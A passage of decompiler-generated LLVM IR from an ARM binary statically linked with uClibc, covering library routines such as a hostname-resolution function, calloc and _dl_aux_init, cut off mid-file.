  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %v9_175a0 = load i32, i32* @r6, align 4
  %v12_175a0 = load i32, i32* @r7, align 4
  %v15_175a0 = load i32, i32* @r8, align 4
  %v18_175a0 = load i32, i32* @sb, align 4
  %v21_175a0 = load i32, i32* @sl, align 4
  %v7_175a4 = icmp eq i32 %arg2, 2
  store i32 %arg2, i32* @r4, align 4
  store i32 %tmp, i32* @r6, align 4
  store i32 %arg4, i32* @r8, align 4
  store i32 %arg1, i32* @sb, align 4
  store i32 %arg5, i32* @sl, align 4
  store i32 %arg7, i32* @fp, align 4
  br i1 %v7_175a4, label %dec_label_pc_175c8, label %dec_label_pc_175e8

dec_label_pc_175c8:                               ; preds = %entry
  store i32 %arg6, i32* @ip, align 4
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg4, i32* @r2, align 4
  store i32 %arg5, i32* @r3, align 4
  %v0_175e0 = call i32 @gethostbyname_r()
  store i32 %v0_175e0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17834

dec_label_pc_175e8:                               ; preds = %entry
  store i32 %arg6, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v7_175f0 = icmp eq i32 %arg2, 10
  %v2_175f4 = inttoptr i32 %arg6 to i32*
  store i32 0, i32* %v2_175f4, align 4
  br i1 %v7_175f0, label %dec_label_pc_175fc, label %dec_label_pc_17830

dec_label_pc_175fc:                               ; preds = %dec_label_pc_175e8
  %v1_175fc = load i32, i32* @r7, align 4
  %v9_175fc = icmp eq i32 %v1_175fc, %arg1
  br i1 %v9_175fc, label %dec_label_pc_17830, label %dec_label_pc_17604

dec_label_pc_17604:                               ; preds = %dec_label_pc_175fc
  %v0_17604 = call i32 @__GI___errno_location()
  store i32 %v0_17604, i32* %r0.global-to-local, align 4
  store i32 %arg6, i32* %ip.global-to-local, align 4
  store i32 %v0_17604, i32* @r5, align 4
  %v0_17610 = load i32, i32* @r4, align 4
  %v0_17614 = load i32, i32* @r6, align 4
  store i32 %v0_17614, i32* %r2.global-to-local, align 4
  %v1_17618 = inttoptr i32 %v0_17604 to i32*
  %v2_17618 = load i32, i32* %v1_17618, align 4
  store i32 %v2_17618, i32* @r4, align 4
  %v0_1761c = load i32, i32* @r8, align 4
  store i32 %v0_1761c, i32* %r3.global-to-local, align 4
  %v0_17620 = load i32, i32* @r7, align 4
  store i32 %v0_17620, i32* %v1_17618, align 4
  %v0_17624 = load i32, i32* @sb, align 4
  store i32 %v0_17624, i32* %r0.global-to-local, align 4
  %v2_17628 = load i32, i32* @sl, align 4
  %v5_17628 = load i32, i32* %ip.global-to-local, align 4
  %v0_1762c = load i32, i32* @fp, align 4
  %v7_17630 = call i32 @__get_hosts_byname_r(i32 %v0_17624, i32 %v0_17610, i32 %v0_17614, i32 %v0_1761c, i32 %v2_17628, i32 %v5_17628, i32 %v0_1762c)
  store i32 %v7_17630, i32* %r0.global-to-local, align 4
  %v2_17634 = icmp eq i32 %v7_17630, 0
  br i1 %v2_17634, label %bb, label %dec_label_pc_17640

bb:                                               ; preds = %dec_label_pc_17604
  %v1_17638 = load i32, i32* @r4, align 4
  %v2_17638 = load i32, i32* @r5, align 4
  %v3_17638 = inttoptr i32 %v2_17638 to i32*
  store i32 %v1_17638, i32* %v3_17638, align 4
  br label %dec_label_pc_17834

dec_label_pc_17640:                               ; preds = %dec_label_pc_17604
  %v0_17640 = load i32, i32* @fp, align 4
  %v1_17640 = inttoptr i32 %v0_17640 to i32*
  %v2_17640 = load i32, i32* %v1_17640, align 4
  store i32 %v2_17640, i32* %r3.global-to-local, align 4
  %v7_17644 = icmp eq i32 %v2_17640, 1
  br i1 %v7_17644, label %dec_label_pc_17660, label %dec_label_pc_1764c

dec_label_pc_1764c:                               ; preds = %dec_label_pc_17640
  %v7_1764c = icmp eq i32 %v2_17640, 4
  br i1 %v7_1764c, label %dec_label_pc_1767c, label %dec_label_pc_17654

dec_label_pc_17654:                               ; preds = %dec_label_pc_1764c
  %v3_17654 = icmp eq i32 %v2_17640, -1
  br i1 %v3_17654, label %dec_label_pc_17670, label %dec_label_pc_17834

dec_label_pc_17660:                               ; preds = %dec_label_pc_17640
  %v7_17660 = icmp eq i32 %v7_17630, 2
  br i1 %v7_17660, label %.thread1, label %bb29

bb29:                                             ; preds = %dec_label_pc_17660
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_17680

.thread1:                                         ; preds = %dec_label_pc_17660
  store i32 1, i32* @r7, align 4
  br label %dec_label_pc_17680

dec_label_pc_17670:                               ; preds = %dec_label_pc_17654
  %v0_17670 = load i32, i32* @r5, align 4
  %v1_17670 = inttoptr i32 %v0_17670 to i32*
  %v2_17670 = load i32, i32* %v1_17670, align 4
  store i32 %v2_17670, i32* %r3.global-to-local, align 4
  %v7_17674 = icmp eq i32 %v2_17670, 2
  br i1 %v7_17674, label %dec_label_pc_1767c, label %dec_label_pc_17834

dec_label_pc_1767c:                               ; preds = %dec_label_pc_17670, %dec_label_pc_1764c
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_17680

dec_label_pc_17680:                               ; preds = %bb29, %.thread1, %dec_label_pc_1767c
  %v0_17680 = load i32, i32* @r8, align 4
  %v1_17680 = sub i32 0, %v0_17680
  %v1_17684 = urem i32 %v1_17680, 4
  store i32 %v1_17684, i32* %r0.global-to-local, align 4
  %v1_17688 = load i32, i32* @sl, align 4
  %v2_17688 = sub i32 %v1_17688, %v1_17684
  %v1_1768c = add i32 %v2_17688, -24
  store i32 %v1_1768c, i32* @sl, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_17698 = load i32, i32* @r4, align 4
  %v1_17698 = load i32, i32* @r5, align 4
  %v2_17698 = inttoptr i32 %v1_17698 to i32*
  store i32 %v0_17698, i32* %v2_17698, align 4
  %v7_1769c = icmp sgt i32 %v1_1768c, 255
  br i1 %v7_1769c, label %dec_label_pc_176a8, label %bb30

bb30:                                             ; preds = %dec_label_pc_17680
  store i32 34, i32* %r0.global-to-local, align 4
  %v0_176a0 = load i32, i32* %r3.global-to-local, align 4
  %v1_176a0 = load i32, i32* @fp, align 4
  %v2_176a0 = inttoptr i32 %v1_176a0 to i32*
  store i32 %v0_176a0, i32* %v2_176a0, align 4
  br label %dec_label_pc_17834

dec_label_pc_176a8:                               ; preds = %dec_label_pc_17680
  %v0_176a03 = load i32, i32* %r3.global-to-local, align 4
  %v1_176a04 = load i32, i32* @fp, align 4
  %v2_176a05 = inttoptr i32 %v1_176a04 to i32*
  store i32 %v0_176a03, i32* %v2_176a05, align 4
  %v0_176a8 = load i32, i32* @r8, align 4
  %v1_176a8 = load i32, i32* %r0.global-to-local, align 4
  %v2_176a8 = add i32 %v1_176a8, %v0_176a8
  store i32 %v2_176a8, i32* @r8, align 4
  store i32 0, i32* @r4, align 4
  %v1_176b0 = add i32 %v2_176a8, 16
  store i32 %v1_176b0, i32* %r2.global-to-local, align 4
  %v1_176b4 = add i32 %v2_176a8, 24
  store i32 %v1_176b4, i32* @r5, align 4
  %v3_176bc = inttoptr i32 %v1_176b0 to i32*
  store i32 %v2_176a8, i32* %v3_176bc, align 4
  %v0_176c0 = load i32, i32* @sb, align 4
  store i32 %v0_176c0, i32* @r1, align 4
  %v0_176c4 = load i32, i32* @r4, align 4
  %v1_176c4 = load i32, i32* %r2.global-to-local, align 4
  %v2_176c4 = add i32 %v1_176c4, 4
  %v3_176c4 = inttoptr i32 %v2_176c4 to i32*
  store i32 %v0_176c4, i32* %v3_176c4, align 4
  %v0_176c8 = load i32, i32* @r5, align 4
  store i32 %v0_176c8, i32* %r0.global-to-local, align 4
  %v0_176cc = load i32, i32* @sl, align 4
  store i32 %v0_176cc, i32* %r2.global-to-local, align 4
  %v3_176d0 = call i32 @strncpy(i32 %v0_176c8, i32 %v0_176c0, i32 %v0_176cc)
  %v0_176d4 = load i32, i32* @r4, align 4
  %v1_176d4 = trunc i32 %v0_176d4 to i8
  %v2_176d4 = load i32, i32* @r5, align 4
  %v3_176d4 = load i32, i32* @sl, align 4
  %v4_176d4 = add i32 %v3_176d4, %v2_176d4
  %v5_176d4 = inttoptr i32 %v4_176d4 to i8*
  store i8 %v1_176d4, i8* %v5_176d4, align 1
  %v0_176d8 = load i32, i32* @sb, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_176e0 = load i32, i32* @r8, align 4
  store i32 %v0_176e0, i32* %r2.global-to-local, align 4
  %v3_176e4 = inttoptr i32 %v0_176d8 to i8*
  %v4_176e4 = call i32 @inet_pton(i32 10, i8* %v3_176e4, i32 %v0_176e0)
  store i32 %v4_176e4, i32* %r0.global-to-local, align 4
  %v1_176e8 = load i32, i32* @r4, align 4
  %v9_176e8 = icmp eq i32 %v4_176e4, %v1_176e8
  br i1 %v9_176e8, label %dec_label_pc_17720, label %dec_label_pc_176f0

dec_label_pc_176f0:                               ; preds = %dec_label_pc_176a8
  store i32 %v1_176b0, i32* @ip, align 4
  %v0_176f8 = load i32, i32* @r6, align 4
  store i32 %v0_176f8, i32* %v2_175f4, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_17700 = load i32, i32* @r6, align 4
  %v2_17700 = add i32 %v1_17700, 8
  %v3_17700 = inttoptr i32 %v2_17700 to i32*
  store i32 10, i32* %v3_17700, align 4
  %v0_17704 = load i32, i32* @r4, align 4
  store i32 %v0_17704, i32* %r0.global-to-local, align 4
  %v0_17708 = load i32, i32* %r3.global-to-local, align 4
  %v1_17708 = add i32 %v0_17708, 6
  store i32 %v1_17708, i32* %r3.global-to-local, align 4
  %v1_1770c = load i32, i32* @r6, align 4
  %v2_1770c = add i32 %v1_1770c, 12
  %v3_1770c = inttoptr i32 %v2_1770c to i32*
  store i32 %v1_17708, i32* %v3_1770c, align 4
  %v0_17710 = load i32, i32* @r5, align 4
  %v1_17710 = load i32, i32* @r6, align 4
  %v2_17710 = inttoptr i32 %v1_17710 to i32*
  store i32 %v0_17710, i32* %v2_17710, align 4
  %v0_17714 = load i32, i32* @ip, align 4
  %v1_17714 = load i32, i32* @r6, align 4
  %v2_17714 = add i32 %v1_17714, 16
  %v3_17714 = inttoptr i32 %v2_17714 to i32*
  store i32 %v0_17714, i32* %v3_17714, align 4
  %v0_17718 = load i32, i32* @r4, align 4
  %v1_17718 = load i32, i32* @fp, align 4
  %v2_17718 = inttoptr i32 %v1_17718 to i32*
  store i32 %v0_17718, i32* %v2_17718, align 4
  br label %dec_label_pc_17834

dec_label_pc_17720:                               ; preds = %dec_label_pc_176a8
  %v0_17720 = load i32, i32* @r7, align 4
  %v2_17720 = icmp eq i32 %v0_17720, 0
  br i1 %v2_17720, label %dec_label_pc_17728, label %dec_label_pc_17820

dec_label_pc_17728:                               ; preds = %dec_label_pc_17720
  %v2_17728 = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_17728, i32* @r4, align 4
  store i32 %v2_17728, i32* %r0.global-to-local, align 4
  store i32 40, i32* @r2, align 4
  %v2_17738 = bitcast i32* %stack_var_-84 to i8*
  %v3_17738 = call i32 @__GI_memset(i8* %v2_17738, i32 0)
  store i32 %v3_17738, i32* %r0.global-to-local, align 4
  %v2_17740 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_17740, i32* @sb, align 4
  %v7_17780 = icmp eq i32 %tmp9, 5
  br label %dec_label_pc_17744

dec_label_pc_17744:                               ; preds = %dec_label_pc_17798, %dec_label_pc_17728
  store i32 %v2_17740, i32* %r2.global-to-local, align 4
  store i32 %v2_17728, i32* %r3.global-to-local, align 4
  %v0_17750 = load i32, i32* @r5, align 4
  store i32 %v0_17750, i32* %r0.global-to-local, align 4
  %v4_17754 = inttoptr i32 %v0_17750 to i8*
  %v5_17754 = call i32 @__dns_lookup(i8* %v4_17754, i32 28, i32 %v2_17740, i32 %v2_17728)
  store i32 %v5_17754, i32* @r4, align 4
  %v1_17758 = icmp slt i32 %v5_17754, 0
  %v0_1775c = load i32, i32* @sl, align 4
  store i32 %v0_1775c, i32* %r2.global-to-local, align 4
  %v0_17760 = load i32, i32* @r7, align 4
  %v1_17760 = add i32 %v0_17760, 1
  store i32 %v1_17760, i32* @r7, align 4
  %v0_17764 = load i32, i32* @r5, align 4
  store i32 %v0_17764, i32* %r0.global-to-local, align 4
  br i1 %v1_17758, label %dec_label_pc_17820, label %dec_label_pc_1776c

dec_label_pc_1776c:                               ; preds = %dec_label_pc_17744
  %v3_1776c = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_1776c, i32* @r1, align 4
  %v3_17770 = call i32 @strncpy(i32 %v0_17764, i32 %v3_1776c, i32 %v0_1775c)
  %v3_17774 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_17774, i32* @r0, align 4
  %v0_17778 = call i32 @free()
  store i32 %v0_17778, i32* %r0.global-to-local, align 4
  %v0_17784 = load i32, i32* @r4, align 4
  store i32 %v0_17784, i32* %r2.global-to-local, align 4
  %v0_17788 = load i32, i32* @r5, align 4
  store i32 %v0_17788, i32* @r3, align 4
  br i1 %v7_17780, label %dec_label_pc_17790, label %dec_label_pc_177c8

dec_label_pc_17790:                               ; preds = %dec_label_pc_1776c
  %v0_17790 = load i32, i32* @r7, align 4
  %v8_17794 = icmp sgt i32 %v0_17790, 5
  br i1 %v8_17794, label %dec_label_pc_177bc, label %dec_label_pc_17798

dec_label_pc_17798:                               ; preds = %dec_label_pc_17790
  store i32 %tmp8, i32* @r1, align 4
  %v3_1779c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1779c, i32* %r0.global-to-local, align 4
  %v0_177a0 = load i32, i32* @sl, align 4
  %v5_177a4 = call i32 @__decode_dotted(i32 %v3_1779c, i32 %tmp8, i32 %v0_17784, i32 %v0_17788, i32 %v0_177a0)
  store i32 %v5_177a4, i32* @r4, align 4
  %v3_177ac = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_177ac, i32* @r0, align 4
  %v0_177b0 = call i32 @free()
  store i32 %v0_177b0, i32* %r0.global-to-local, align 4
  %v0_177b4 = load i32, i32* @r4, align 4
  %v1_177b4 = icmp slt i32 %v0_177b4, 0
  br i1 %v1_177b4, label %dec_label_pc_177bc, label %dec_label_pc_17744

dec_label_pc_177bc:                               ; preds = %dec_label_pc_17798, %dec_label_pc_17790
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17828

dec_label_pc_177c8:                               ; preds = %dec_label_pc_1776c
  %v7_177c8 = icmp eq i32 %tmp9, 28
  br i1 %v7_177c8, label %dec_label_pc_177d0, label %dec_label_pc_17818

dec_label_pc_177d0:                               ; preds = %dec_label_pc_177c8
  store i32 16, i32* @r2, align 4
  %v0_177d8 = load i32, i32* @r8, align 4
  store i32 %v0_177d8, i32* @r0, align 4
  %v0_177dc = call i32 @memcpy()
  store i32 10, i32* %r3.global-to-local, align 4
  store i32 %v1_176b0, i32* %r2.global-to-local, align 4
  %v1_177e8 = load i32, i32* @r6, align 4
  %v2_177e8 = add i32 %v1_177e8, 8
  %v3_177e8 = inttoptr i32 %v2_177e8 to i32*
  store i32 10, i32* %v3_177e8, align 4
  %v0_177ec = load i32, i32* %r3.global-to-local, align 4
  %v1_177ec = add i32 %v0_177ec, 6
  store i32 %v1_177ec, i32* %r3.global-to-local, align 4
  %v1_177f0 = load i32, i32* @r6, align 4
  %v2_177f0 = add i32 %v1_177f0, 12
  %v3_177f0 = inttoptr i32 %v2_177f0 to i32*
  store i32 %v1_177ec, i32* %v3_177f0, align 4
  %v3_177f4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_177f4, i32* @r0, align 4
  %v0_177f8 = load i32, i32* @r5, align 4
  %v1_177f8 = load i32, i32* @r6, align 4
  %v2_177f8 = inttoptr i32 %v1_177f8 to i32*
  store i32 %v0_177f8, i32* %v2_177f8, align 4
  %v0_177fc = load i32, i32* %r2.global-to-local, align 4
  %v1_177fc = load i32, i32* @r6, align 4
  %v2_177fc = add i32 %v1_177fc, 16
  %v3_177fc = inttoptr i32 %v2_177fc to i32*
  store i32 %v0_177fc, i32* %v3_177fc, align 4
  %v0_17800 = call i32 @free()
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %arg6, i32* @ip, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_17810 = load i32, i32* @r6, align 4
  store i32 %v0_17810, i32* %v2_175f4, align 4
  %v0_17828.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17828

dec_label_pc_17818:                               ; preds = %dec_label_pc_177c8
  %v3_17818 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_17818, i32* @r0, align 4
  %v0_1781c = call i32 @free()
  store i32 %v0_1781c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17820

dec_label_pc_17820:                               ; preds = %dec_label_pc_17744, %dec_label_pc_17720, %dec_label_pc_17818
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17828

dec_label_pc_17828:                               ; preds = %dec_label_pc_177d0, %dec_label_pc_177bc, %dec_label_pc_17820
  %v0_17828 = phi i32 [ %v0_17828.pre, %dec_label_pc_177d0 ], [ 3, %dec_label_pc_177bc ], [ 1, %dec_label_pc_17820 ]
  %v1_17828 = load i32, i32* @fp, align 4
  %v2_17828 = inttoptr i32 %v1_17828 to i32*
  store i32 %v0_17828, i32* %v2_17828, align 4
  br label %dec_label_pc_17834

dec_label_pc_17830:                               ; preds = %dec_label_pc_175e8, %dec_label_pc_175fc
  store i32 22, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17834

dec_label_pc_17834:                               ; preds = %bb, %bb30, %dec_label_pc_17670, %dec_label_pc_17654, %dec_label_pc_17828, %dec_label_pc_176f0, %dec_label_pc_175c8, %dec_label_pc_17830
  store i32 %v9_175a0, i32* @r6, align 4
  store i32 %v12_175a0, i32* @r7, align 4
  store i32 %v15_175a0, i32* @r8, align 4
  store i32 %v18_175a0, i32* @sb, align 4
  store i32 %v21_175a0, i32* @sl, align 4
  %v1_1783c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_1783c

; uselistorder directives
  uselistorder i32 %v2_17728, { 1, 0, 2, 3 }
  uselistorder i32 %v1_176b0, { 2, 1, 0, 3 }
  uselistorder i32 %v1_17684, { 1, 0 }
  uselistorder i32* %stack_var_-84, { 1, 2, 0, 3 }
  uselistorder i32 %tmp8, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r0.global-to-local, { 22, 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 12, 10, 11, 14, 13, 15, 17, 16, 18, 20, 19, 21, 23 }
  uselistorder i32 (i32, i32, i32)* @strncpy, { 1, 0, 2 }
  uselistorder i32 -24, { 1, 0 }
  uselistorder i32 %arg6, { 4, 3, 0, 2, 1 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_17834, { 7, 4, 5, 1, 2, 3, 0, 6 }
  uselistorder label %dec_label_pc_17830, { 1, 0 }
  uselistorder label %dec_label_pc_17828, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17820, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17680, { 2, 1, 0 }
}

define i32 @calloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v3_17840 = load i32, i32* @r4, align 4
  %v6_17840 = load i32, i32* @r5, align 4
  %v9_17840 = load i32, i32* @r6, align 4
  %v12_17840 = load i32, i32* @lr, align 4
  %v2_17848 = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i16* @global_var_26010.295 to i32), i32* @r5, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_17858 = mul i32 %arg2, %arg1
  store i32 %v2_17858, i32* @r6, align 4
  br i1 %v2_17848, label %dec_label_pc_17888, label %dec_label_pc_17860

dec_label_pc_17860:                               ; preds = %entry
  %v2_17868 = udiv i32 %v2_17858, %arg1
  %v9_1786c = icmp eq i32 %v2_17868, %arg2
  br i1 %v9_1786c, label %dec_label_pc_17888, label %dec_label_pc_17874

dec_label_pc_17874:                               ; preds = %dec_label_pc_17860
  %v0_17874 = call i32 @__GI___errno_location()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_17880 = inttoptr i32 %v0_17874 to i32*
  store i32 12, i32* %v2_17880, align 4
  br label %dec_label_pc_1794c

dec_label_pc_17888:                               ; preds = %dec_label_pc_17860, %entry
  %v4_1788c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 72) to i32*), align 4
  store i32 %v4_1788c, i32* @r4, align 4
  %v4_178a4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 76) to i32*), align 4
  store i32 %v4_178a4, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_178a4)
  %v0_178b8 = load i32, i32* @r5, align 4
  %v2_178b8 = add i32 %v0_178b8, 16
  %v3_178b8 = inttoptr i32 %v2_178b8 to i32*
  %v4_178b8 = load i32, i32* %v3_178b8, align 4
  store i32 %v4_178b8, i32* %ip.global-to-local, align 4
  store i32 96452, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_178b8)
  %v0_178c4 = load i32, i32* @r6, align 4
  %v1_178c8 = call i32 @malloc(i32 %v0_178c4)
  store i32 %v1_178c8, i32* %r4.global-to-local, align 4
  %v2_178cc = icmp eq i32 %v1_178c8, 0
  br i1 %v2_178cc, label %.thread, label %dec_label_pc_178d4

dec_label_pc_178d4:                               ; preds = %dec_label_pc_17888
  %v1_178d4 = add i32 %v1_178c8, -4
  %v2_178d4 = inttoptr i32 %v1_178d4 to i32*
  %v3_178d4 = load i32, i32* %v2_178d4, align 4
  %v1_178d8 = and i32 %v3_178d4, 2
  %v2_178d8 = icmp eq i32 %v1_178d8, 0
  br i1 %v2_178d8, label %dec_label_pc_178e0, label %.thread

dec_label_pc_178e0:                               ; preds = %dec_label_pc_178d4
  %v1_178e06 = add i32 %v3_178d4, -4
  %v1_178e4 = and i32 %v1_178e06, -4
  store i32 %v1_178e4, i32* @r2, align 4
  %v3_178e8 = udiv i32 %v1_178e4, 4
  store i32 %v3_178e8, i32* %ip.global-to-local, align 4
  %tmp = icmp eq i32 %v1_178e4, 36
  %v2_178f0 = icmp ult i32 %v1_178e4, 33
  %v3_178f0 = or i1 %tmp, %v2_178f0
  br i1 %v3_178f0, label %dec_label_pc_178fc, label %dec_label_pc_178f4

dec_label_pc_178f4:                               ; preds = %dec_label_pc_178e0
  %v2_178f4 = inttoptr i32 %v1_178c8 to i8*
  %v3_178f4 = call i32 @__GI_memset(i8* %v2_178f4, i32 0)
  br label %.thread

dec_label_pc_178fc:                               ; preds = %dec_label_pc_178e0
  %tmp7 = icmp eq i32 %v1_178e4, 16
  %v2_17900 = inttoptr i32 %v1_178c8 to i32*
  store i32 0, i32* %v2_17900, align 4
  %v1_17904 = load i32, i32* %r4.global-to-local, align 4
  %v2_17904 = add i32 %v1_17904, 4
  %v3_17904 = inttoptr i32 %v2_17904 to i32*
  store i32 0, i32* %v3_17904, align 4
  %v1_17908 = load i32, i32* %r4.global-to-local, align 4
  %v2_17908 = add i32 %v1_17908, 8
  %v3_17908 = inttoptr i32 %v2_17908 to i32*
  store i32 0, i32* %v3_17908, align 4
  %v2_1790c = icmp ult i32 %v1_178e4, 13
  %v3_1790c = or i1 %tmp7, %v2_1790c
  br i1 %v3_1790c, label %.thread, label %dec_label_pc_17910

dec_label_pc_17910:                               ; preds = %dec_label_pc_178fc
  %v0_17910 = load i32, i32* %ip.global-to-local, align 4
  %v1_17914 = load i32, i32* %r4.global-to-local, align 4
  %v2_17914 = add i32 %v1_17914, 12
  %v3_17914 = inttoptr i32 %v2_17914 to i32*
  store i32 0, i32* %v3_17914, align 4
  %v1_17918 = load i32, i32* %r4.global-to-local, align 4
  %v2_17918 = add i32 %v1_17918, 16
  %v3_17918 = inttoptr i32 %v2_17918 to i32*
  store i32 0, i32* %v3_17918, align 4
  %tmp8 = icmp ult i32 %v0_17910, 7
  br i1 %tmp8, label %.thread, label %dec_label_pc_17920

dec_label_pc_17920:                               ; preds = %dec_label_pc_17910
  %v0_17920 = load i32, i32* %ip.global-to-local, align 4
  %v7_17920 = icmp eq i32 %v0_17920, 9
  %v1_17924 = load i32, i32* %r4.global-to-local, align 4
  %v2_17924 = add i32 %v1_17924, 20
  %v3_17924 = inttoptr i32 %v2_17924 to i32*
  store i32 0, i32* %v3_17924, align 4
  %v1_17928 = load i32, i32* %r4.global-to-local, align 4
  %v2_17928 = add i32 %v1_17928, 24
  %v3_17928 = inttoptr i32 %v2_17928 to i32*
  store i32 0, i32* %v3_17928, align 4
  br i1 %v7_17920, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_17920
  %v2_1792c = load i32, i32* %r4.global-to-local, align 4
  %v3_1792c = add i32 %v2_1792c, 32
  %v4_1792c = inttoptr i32 %v3_1792c to i32*
  store i32 0, i32* %v4_1792c, align 4
  %v2_17930 = load i32, i32* %r4.global-to-local, align 4
  %v3_17930 = add i32 %v2_17930, 28
  %v4_17930 = inttoptr i32 %v3_17930 to i32*
  store i32 0, i32* %v4_17930, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_17920, %dec_label_pc_178d4, %dec_label_pc_17910, %dec_label_pc_178fc, %dec_label_pc_17888, %dec_label_pc_178f4, %bb
  %v0_17940 = load i32, i32* @r5, align 4
  %v2_17940 = add i32 %v0_17940, 24
  %v3_17940 = inttoptr i32 %v2_17940 to i32*
  %v4_17940 = load i32, i32* %v3_17940, align 4
  store i32 %v4_17940, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_17940)
  br label %dec_label_pc_1794c

dec_label_pc_1794c:                               ; preds = %dec_label_pc_17874, %.thread
  %v0_1794c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_17840, i32* @r4, align 4
  store i32 %v6_17840, i32* @r5, align 4
  store i32 %v9_17840, i32* @r6, align 4
  store i32 %v12_17840, i32* @lr, align 4
  ret i32 %v0_1794c

; uselistorder directives
  uselistorder i32 %v1_178e4, { 0, 5, 1, 4, 3, 2 }
  uselistorder i32 %v1_178c8, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 13, { 0, 3, 4, 6, 5, 1, 7, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1794c, { 1, 0 }
  uselistorder label %.thread, { 6, 0, 2, 3, 5, 1, 4 }
}

define i32 @function_17960(i32 %arg1) local_unnamed_addr {
dec_label_pc_17960:
  %v0_17960 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17960, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_17960
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_17960, %bb
  %v10_17970 = phi i32 [ %arg1, %dec_label_pc_17960 ], [ 0, %bb ]
  ret i32 %v10_17970

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i16* @global_var_26010.295 to i32), i32* %r2.global-to-local, align 4
  %v4_17980 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 104) to i32*), align 4
  %v4_17988 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 68) to i32*), align 4
  store i32 %v4_17988, i32* %r1.global-to-local, align 4
  %v1_1798c = add i32 %arg1, 44
  %v2_1798c = inttoptr i32 %v1_1798c to i32*
  %v3_1798c = load i32, i32* %v2_1798c, align 4
  %v1_17990 = add i32 %arg1, 28
  %v2_17990 = inttoptr i32 %v1_17990 to i32*
  %v3_17990 = load i32, i32* %v2_17990, align 4
  store i32 %v3_17990, i32* %r2.global-to-local, align 4
  %v2_17994 = inttoptr i32 %v4_17980 to i32*
  store i32 %v3_1798c, i32* %v2_17994, align 4
  %v0_17998 = load i32, i32* %r2.global-to-local, align 4
  %v1_17998 = load i32, i32* %r1.global-to-local, align 4
  %v2_17998 = inttoptr i32 %v1_17998 to i32*
  store i32 %v0_17998, i32* %v2_17998, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_179a4(i32 %arg1) local_unnamed_addr {
dec_label_pc_179a4:
  %v0_179a4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_179a4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_179a4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_179a4, %bb
  %v4_179a8 = phi i32 [ %arg1, %dec_label_pc_179a4 ], [ 0, %bb ]
  ret i32 %v4_179a8

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
dec_label_pc_179e8:
